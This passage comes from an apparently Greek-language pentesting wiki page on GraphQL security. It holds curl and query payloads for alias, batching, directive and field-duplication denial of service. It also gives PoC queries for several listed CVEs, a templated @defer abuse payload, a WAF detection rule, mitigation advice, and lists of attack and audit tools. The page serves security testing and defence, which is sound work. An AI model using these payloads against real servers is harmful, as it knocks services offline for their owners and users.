-d '{"query": "{ alias0:__typename \nalias1:__typename \nalias2:__typename \nalias3:__typename \nalias4:__typename \nalias5:__typename \nalias6:__typename \nalias7:__typename \nalias8:__typename \nalias9:__typename \nalias10:__typename \nalias11:__typename \nalias12:__typename \nalias13:__typename \nalias14:__typename \nalias15:__typename \nalias16:__typename \nalias17:__typename \nalias18:__typename \nalias19:__typename \nalias20:__typename \nalias21:__typename \nalias22:__typename \nalias23:__typename \nalias24:__typename \nalias25:__typename \nalias26:__typename \nalias27:__typename \nalias28:__typename \nalias29:__typename \nalias30:__typename \nalias31:__typename \nalias32:__typename \nalias33:__typename \nalias34:__typename \nalias35:__typename \nalias36:__typename \nalias37:__typename \nalias38:__typename \nalias39:__typename \nalias40:__typename \nalias41:__typename \nalias42:__typename \nalias43:__typename \nalias44:__typename \nalias45:__typename \nalias46:__typename \nalias47:__typename \nalias48:__typename \nalias49:__typename \nalias50:__typename \nalias51:__typename \nalias52:__typename \nalias53:__typename \nalias54:__typename \nalias55:__typename \nalias56:__typename \nalias57:__typename \nalias58:__typename \nalias59:__typename \nalias60:__typename \nalias61:__typename \nalias62:__typename \nalias63:__typename \nalias64:__typename \nalias65:__typename \nalias66:__typename \nalias67:__typename \nalias68:__typename \nalias69:__typename \nalias70:__typename \nalias71:__typename \nalias72:__typename \nalias73:__typename \nalias74:__typename \nalias75:__typename \nalias76:__typename \nalias77:__typename \nalias78:__typename \nalias79:__typename \nalias80:__typename \nalias81:__typename \nalias82:__typename \nalias83:__typename \nalias84:__typename \nalias85:__typename \nalias86:__typename \nalias87:__typename \nalias88:__typename \nalias89:__typename \nalias90:__typename \nalias91:__typename \nalias92:__typename \nalias93:__typename \nalias94:__typename \nalias95:__typename \nalias96:__typename \nalias97:__typename \nalias98:__typename \nalias99:__typename \nalias100:__typename \n }"}' \
'https://example.com/graphql'
```
Για να μετριαστεί αυτό, εφαρμόστε όρια στον αριθμό των ψευδωνύμων, ανάλυση πολυπλοκότητας ερωτημάτων ή περιορισμό ρυθμού για να αποτραπεί η κακή χρήση πόρων.

### **Batching Ερωτημάτων Βασισμένο σε Πίνακες**

**Batching Ερωτημάτων Βασισμένο σε Πίνακες** είναι μια ευπάθεια όπου ένα GraphQL API επιτρέπει το batching πολλαπλών ερωτημάτων σε ένα μόνο αίτημα, επιτρέποντας σε έναν επιτιθέμενο να στείλει έναν μεγάλο αριθμό ερωτημάτων ταυτόχρονα. Αυτό μπορεί να κατακλύσει το backend εκτελώντας όλα τα batched ερωτήματα παράλληλα, καταναλώνοντας υπερβολικούς πόρους (CPU, μνήμη, συνδέσεις βάσης δεδομένων) και ενδεχομένως να οδηγήσει σε **Denial of Service (DoS)**. Εάν δεν υπάρχει όριο στον αριθμό των ερωτημάτων σε ένα batch, ένας επιτιθέμενος μπορεί να εκμεταλλευτεί αυτό για να υποβαθμίσει τη διαθεσιμότητα της υπηρεσίας.
```graphql
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '[{"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}]' \
'https://example.com/graphql'
```
Σε αυτό το παράδειγμα, 10 διαφορετικά ερωτήματα ομαδοποιούνται σε ένα αίτημα, αναγκάζοντας τον διακομιστή να εκτελέσει όλα ταυτόχρονα. Εάν εκμεταλλευτεί με μεγαλύτερο μέγεθος ομαδοποίησης ή υπολογιστικά δαπανηρά ερωτήματα, μπορεί να υπερφορτώσει τον διακομιστή.

### **Ευπάθεια Υπερφόρτωσης Οδηγιών**

**Υπερφόρτωση Οδηγιών** συμβαίνει όταν ένας διακομιστής GraphQL επιτρέπει ερωτήματα με υπερβολικές, επαναλαμβανόμενες οδηγίες. Αυτό μπορεί να κατακλύσει τον αναλυτή και τον εκτελεστή του διακομιστή, ειδικά αν ο διακομιστής επεξεργάζεται επανειλημμένα την ίδια λογική οδηγίας. Χωρίς κατάλληλη επικύρωση ή όρια, ένας επιτιθέμενος μπορεί να εκμεταλλευτεί αυτό δημιουργώντας ένα ερώτημα με πολλές επαναλαμβανόμενες οδηγίες για να προκαλέσει υψηλή υπολογιστική ή μνημονιακή χρήση, οδηγώντας σε **Denial of Service (DoS)**.
```bash
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @aa@aa@aa@aa@aa@aa@aa@aa@aa@aa }", "operationName": "cop"}' \
'https://example.com/graphql'
```
Σημειώστε ότι στο προηγούμενο παράδειγμα το `@aa` είναι μια προσαρμοσμένη οδηγία που **μπορεί να μην έχει δηλωθεί**. Μια κοινή οδηγία που συνήθως υπάρχει είναι η **`@include`**:
```bash
curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @include(if: true) @include(if: true) @include(if: true) @include(if: true) @include(if: true) }", "operationName": "cop"}' \
'https://example.com/graphql'
```
Μπορείτε επίσης να στείλετε ένα ερώτημα introspection για να ανακαλύψετε όλες τις δηλωμένες οδηγίες:
```bash
curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "{ __schema { directives { name locations args { name type { name kind ofType { name } } } } } }"}' \
'https://example.com/graphql'
```
Και στη συνέχεια **χρησιμοποιήστε μερικά από τα προσαρμοσμένα**.

### **Ευπάθεια Διπλασιασμού Πεδίου**

**Διπλασιασμός Πεδίου** είναι μια ευπάθεια όπου ένας GraphQL server επιτρέπει ερωτήματα με το ίδιο πεδίο να επαναλαμβάνεται υπερβολικά. Αυτό αναγκάζει τον server να επιλύει το πεδίο επαναληπτικά για κάθε περίπτωση, καταναλώνοντας σημαντικούς πόρους (CPU, μνήμη και κλήσεις βάσης δεδομένων). Ένας επιτιθέμενος μπορεί να δημιουργήσει ερωτήματα με εκατοντάδες ή χιλιάδες επαναλαμβανόμενα πεδία, προκαλώντας υψηλό φορτίο και ενδεχομένως οδηγώντας σε **Άρνηση Υπηρεσίας (DoS)**.
```bash
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" -H "Content-Type: application/json" \
-d '{"query": "query cop { __typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n} ", "operationName": "cop"}' \
'https://example.com/graphql'
```
## Πρόσφατες Ευπάθειες (2023-2025)

> Το οικοσύστημα του GraphQL εξελίσσεται πολύ γρήγορα. Κατά τη διάρκεια των τελευταίων δύο ετών, αποκαλύφθηκαν αρκετά κρίσιμα ζητήματα στις πιο χρησιμοποιούμενες βιβλιοθήκες διακομιστών. Όταν βρείτε ένα GraphQL endpoint, αξίζει να κάνετε fingerprinting της μηχανής (δείτε **graphw00f**) και να ελέγξετε την τρέχουσα έκδοση σε σχέση με τις ευπάθειες παρακάτω.

### CVE-2024-47614 – `async-graphql` directive-overload DoS (Rust)
* Επηρεαζόμενη: async-graphql < **7.0.10** (Rust)
* Αιτία: καμία περιοριστική πολιτική στις **διπλές οδηγίες** (π.χ. χιλιάδες `@include`) που επεκτείνονται σε έναν εκθετικό αριθμό κόμβων εκτέλεσης.
* Επιπτώσεις: ένα μόνο HTTP αίτημα μπορεί να εξαντλήσει CPU/RAM και να καταρρεύσει την υπηρεσία.
* Διόρθωση/μείωση: αναβάθμιση ≥ 7.0.10 ή κλήση `SchemaBuilder.limit_directives()`; εναλλακτικά, φιλτράρετε τα αιτήματα με έναν κανόνα WAF όπως `"@include.*@include.*@include"`.
```graphql
# PoC – repeat @include X times
query overload {
__typename @include(if:true) @include(if:true) @include(if:true)
}
```
### CVE-2024-40094 – `graphql-java` ENF βάθος/πολυπλοκότητα παράκαμψη
* Επηρεαζόμενα: graphql-java < 19.11, 20.0-20.8, 21.0-21.4
* Ρίζα αιτία: **ExecutableNormalizedFields** δεν λήφθηκαν υπόψη από την παρακολούθηση `MaxQueryDepth` / `MaxQueryComplexity`. Οι αναδρομικοί θραύσματα λοιπόν παρέκαμψαν όλους τους περιορισμούς.
* Επιπτώσεις: μη αυθεντικοποιημένο DoS κατά των Java στοίβων που ενσωματώνουν το graphql-java (Spring Boot, Netflix DGS, προϊόντα Atlassian…).
```graphql
fragment A on Query { ...B }
fragment B on Query { ...A }
query { ...A }
```
### CVE-2023-23684 – WPGraphQL SSRF to RCE chain
* Αφορά: WPGraphQL ≤ 1.14.5 (πρόσθετο WordPress).
* Αιτία: η μεταβολή `createMediaItem` αποδεχόταν URLs **`filePath`** που ελέγχονταν από τον επιτιθέμενο, επιτρέποντας πρόσβαση στο εσωτερικό δίκτυο και εγγραφές αρχείων.
* Επιπτώσεις: οι αυθεντικοποιημένοι Συντάκτες/Συγγραφείς θα μπορούσαν να φτάσουν σε σημεία μεταδεδομένων ή να γράψουν αρχεία PHP για απομακρυσμένη εκτέλεση κώδικα.

---

## Κατάχρηση σταδιακής παράδοσης: `@defer` / `@stream`
Από το 2023 οι περισσότερες κύριες διακομιστές (Apollo 4, GraphQL-Java 20+, HotChocolate 13) υλοποίησαν τις κατευθυντήριες γραμμές **σταδιακής παράδοσης** που ορίστηκαν από την ομάδα εργασίας GraphQL-over-HTTP. Κάθε αναβληθείσα επιδιόρθωση αποστέλλεται ως **ξεχωριστό κομμάτι**, έτσι το συνολικό μέγεθος της απάντησης γίνεται *N + 1* (φάκελος + επιδιορθώσεις). Μια ερώτηση που περιέχει χιλιάδες μικρά αναβληθέντα πεδία παράγει επομένως μια μεγάλη απάντηση ενώ κοστίζει στον επιτιθέμενο μόνο μία αίτηση – μια κλασική **αύξηση DoS** και ένας τρόπος να παρακαμφθούν οι κανόνες WAF που ελέγχουν μόνο το πρώτο κομμάτι. Τα μέλη της ομάδας εργασίας σημείωσαν οι ίδιοι τον κίνδυνο.

Παράδειγμα payload που παράγει 2 000 επιδιορθώσεις:
```graphql
query abuse {
% for i in range(0,2000):
f{{i}}: __typename @defer
% endfor
}
```
Mitigation: απενεργοποιήστε το `@defer/@stream` στην παραγωγή ή επιβάλετε `max_patches`, σωρευτικό `max_bytes` και χρόνο εκτέλεσης. Βιβλιοθήκες όπως το **graphql-armor** (βλ. παρακάτω) ήδη επιβάλλουν λογικές προεπιλογές.

---

## Αμυντικό middleware (2024+)

| Project | Notes |
|---|---|
| **graphql-armor** | Node/TypeScript validation middleware που δημοσιεύθηκε από την Escape Tech. Υλοποιεί όρια plug-and-play για βάθος ερωτήματος, αριθμούς alias/field/directive, tokens και κόστος; συμβατό με Apollo Server, GraphQL Yoga/Envelop, Helix, κ.λπ. |

Quick start:
```ts
import { protect } from '@escape.tech/graphql-armor';
import { applyMiddleware } from 'graphql-middleware';

const protectedSchema = applyMiddleware(schema, ...protect());
```
`graphql-armor` θα μπλοκάρει τώρα υπερβολικά βαθιές, πολύπλοκες ή πλούσιες σε οδηγίες ερωτήσεις, προστατεύοντας από τα παραπάνω CVEs.

---

## Εργαλεία

### Σαρωτές ευπαθειών

- [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): Δοκιμή κοινών κακοδιαρθρώσεων των graphql endpoints
- [https://github.com/assetnote/batchql](https://github.com/assetnote/batchql): Σενάριο ελέγχου ασφαλείας GraphQL με έμφαση στην εκτέλεση παρτίδων ερωτήσεων και μεταλλάξεων GraphQL.
- [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): Αναγνώριση του graphql που χρησιμοποιείται
- [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Εργαλείο που μπορεί να χρησιμοποιηθεί για να αποκτήσει σχήματα και να αναζητήσει ευαίσθητα δεδομένα, να δοκιμάσει εξουσιοδότηση, να επιτεθεί σε σχήματα με βία και να βρει διαδρομές σε έναν δεδομένο τύπο.
- [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Μπορεί να χρησιμοποιηθεί ως αυτόνομο ή [Burp extension](https://github.com/doyensec/inql).
- [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Μπορεί να χρησιμοποιηθεί και ως CLI client για αυτοματοποίηση επιθέσεων: `python3 graphqlmap.py -u http://example.com/graphql --inject`
- [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Εργαλείο που απαριθμεί τους διαφορετικούς τρόπους **πρόσβασης σε έναν δεδομένο τύπο σε ένα σχήμα GraphQL**.
- [https://github.com/doyensec/GQLSpection](https://github.com/doyensec/GQLSpection): Ο διάδοχος των Αυτόνομων και CLI Λειτουργιών του InQL
- [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Burp extension ή σενάριο python για προηγμένο έλεγχο GraphQL. Ο _**Σαρωτής**_ είναι ο πυρήνας του InQL v5.0, όπου μπορείτε να αναλύσετε ένα graphql endpoint ή ένα τοπικό αρχείο σχήματος introspection. Δημιουργεί αυτόματα όλες τις δυνατές ερωτήσεις και μεταλλάξεις, οργανώνοντάς τις σε μια δομημένη προβολή για την ανάλυσή σας. Το _**Συστατικό Επιθέσεων**_ σας επιτρέπει να εκτελείτε επιθέσεις παρτίδας GraphQL, οι οποίες μπορεί να είναι χρήσιμες για την παράκαμψη κακώς υλοποιημένων περιορισμών ρυθμού: `python3 inql.py -t http://example.com/graphql -o output.json`
- [https://github.com/nikitastupin/clairvoyance](https://github.com/nikitastupin/clairvoyance): Προσπαθήστε να αποκτήσετε το σχήμα ακόμη και με την introspection απενεργοποιημένη χρησιμοποιώντας τη βοήθεια ορισμένων βάσεων δεδομένων Graphql που θα προτείνουν τα ονόματα των μεταλλάξεων και των παραμέτρων.

### Σενάρια για εκμετάλλευση κοινών ευπαθειών

- [https://github.com/reycotallo98/pentestScripts/tree/main/GraphQLDoS](https://github.com/reycotallo98/pentestScripts/tree/main/GraphQLDoS): Συλλογή σεναρίων για την εκμετάλλευση ευπαθειών άρνησης υπηρεσίας σε ευάλωτα περιβάλλοντα graphql.

### Πελάτες

- [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUI client
- [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUI Client

### Αυτόματοι Έλεγχοι

{{#ref}}
https://graphql-dashboard.herokuapp.com/
{{#endref}}

- Βίντεο που εξηγεί το AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Αναφορές

- [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
- [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
- [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
- [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
- [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)
- [**https://github.com/advisories/GHSA-5gc2-7c65-8fq8**](https://github.com/advisories/GHSA-5gc2-7c65-8fq8)
- [**https://github.com/escape-tech/graphql-armor**](https://github.com/escape-tech/graphql-armor)

{{#include ../../banners/hacktricks-training.md}}
